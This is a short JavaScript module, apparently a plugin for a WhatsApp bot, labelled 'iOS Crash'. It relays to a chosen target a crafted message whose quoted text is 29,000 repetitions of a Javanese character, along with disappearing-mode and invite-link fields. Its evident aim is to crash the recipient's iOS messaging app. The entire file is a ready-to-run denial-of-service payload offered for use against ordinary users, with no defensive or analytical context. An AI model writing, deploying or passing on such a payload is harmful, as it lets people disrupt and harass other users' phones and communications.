const PAYLOAD = 'ꦾ'.repeat(29000);

export default {
  id: 'xios',
  name: 'iOS Crash',

  async execute({ sock, target }) {
    const msg = {
      extendedTextMessage: {
        text: '.',
        contextInfo: {
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: PAYLOAD,
          },
          disappearingMode: {
            initiator: 'CHANGED_IN_CHAT',
            trigger: 'CHAT_SETTING',
          },
        },
        inviteLinkGroupTypeV2: 'DEFAULT',
      },
    };

    await sock.relayMessage(target, msg, {});
  },
};
